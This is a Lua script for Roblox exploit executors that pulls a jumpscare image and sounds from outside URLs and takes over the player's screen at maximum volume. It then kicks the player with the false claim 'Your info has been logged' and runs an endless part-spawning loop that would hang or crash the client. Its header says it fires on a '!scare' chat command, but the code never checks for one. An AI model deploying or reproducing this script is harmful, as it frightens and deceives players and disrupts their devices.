--// Script: Trigger jumpscare once when player "khasa2394" sends "!scare", but not if LocalPlayer is "khasa2394"

getgenv().GoldiwasHereLOL = Vector3.new(0, 0, 0)

local jumpscareMp3Url = "https://github.com/ReemanS/heartstopper/raw/refs/heads/main/src/assets/jumpscareSound.mp3"
local jumpscareMp3FileName = "jumpscareSound.mp3"

local imageUrl = "https://raw.githubusercontent.com/ReemanS/heartstopper/refs/heads/main/src/assets/jumpscareImage.jpg"
local imageFileName = "jumpscareImage.jpg"

local extraSoundUrl = "https://kappa.vgmsite.com/soundtracks/sonic.exe-the-game-2014/qppbxnzkts/02.%20Hill%20Zone.mp3"
local extraSoundFileName = "hillzone.mp3"

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer
if LocalPlayer.Name == "khasa2394" then return end

local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")

local request = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or (krnl and krnl.request)

if not getcustomasset then
	getgenv().getcustomasset = function(path)
		assert(type(path) == "string", "invalid path")
		if not isfile(path) then error("file not found: " .. path) end
		return "rbxasset://" .. path
	end
end

local function downloadFile(url, fileName)
	if isfile(fileName) then return end
	if not request then
		writefile(fileName, "-- executor does not support HTTP requests\n")
		return
	end
	local ok, res = pcall(function()
		return request({Url = url, Method = "GET"})
	end)
	if ok and res and res.Body and res.StatusCode == 200 then
		writefile(fileName, res.Body)
	else
		writefile(fileName, "-- failed to download "..fileName.."\n")
	end
end

downloadFile(jumpscareMp3Url, jumpscareMp3FileName)
downloadFile(imageUrl, imageFileName)
downloadFile(extraSoundUrl, extraSoundFileName)

local alreadyScared = false

if not alreadyScared then
	alreadyScared = true

	for _, gui in pairs(PlayerGui:GetChildren()) do
		if gui:IsA("ScreenGui") then
			gui.Enabled = false
		end
	end

	pcall(function()
		for _, gui in pairs(CoreGui:GetChildren()) do
			if gui:IsA("ScreenGui") then
				gui.Enabled = false
			end
		end
	end)

	local overlayGui = Instance.new("ScreenGui")
	overlayGui.Name = "JumpscareOverlay"
	overlayGui.ResetOnSpawn = false
	overlayGui.IgnoreGuiInset = true
	overlayGui.DisplayOrder = 1e9
	overlayGui.Parent = CoreGui

	local imageLabel = Instance.new("ImageLabel")
	imageLabel.Size = UDim2.new(1, 0, 1, 0)
	imageLabel.Position = UDim2.new(0, 0, 0, 0)
	imageLabel.BackgroundTransparency = 1
	imageLabel.Image = getcustomasset(imageFileName)
	imageLabel.Parent = overlayGui

	local jumpscareSound = Instance.new("Sound")
	jumpscareSound.SoundId = getcustomasset(jumpscareMp3FileName)
	jumpscareSound.Volume = 100
	jumpscareSound.Looped = false
	jumpscareSound.Parent = workspace
	jumpscareSound:Play()

	jumpscareSound.Ended:Connect(function()
		local extraSound = Instance.new("Sound")
		extraSound.SoundId = getcustomasset(extraSoundFileName)
		extraSound.Volume = 100
		extraSound.Looped = false
		extraSound.Parent = workspace
		extraSound:Play()

		task.wait(0.5)
		LocalPlayer:Kick("Your info has been logged.")
for i = 1, math.huge do
					local part = Instance.new("Part")
					part.Size = Vector3.new(1, 1, 1)
					part.Position = Vector3.new(math.random(-50, 50), math.random(10, 30), math.random(-50, 50))
					part.Anchored = false
					part.Parent = workspace
				end
	end)
end

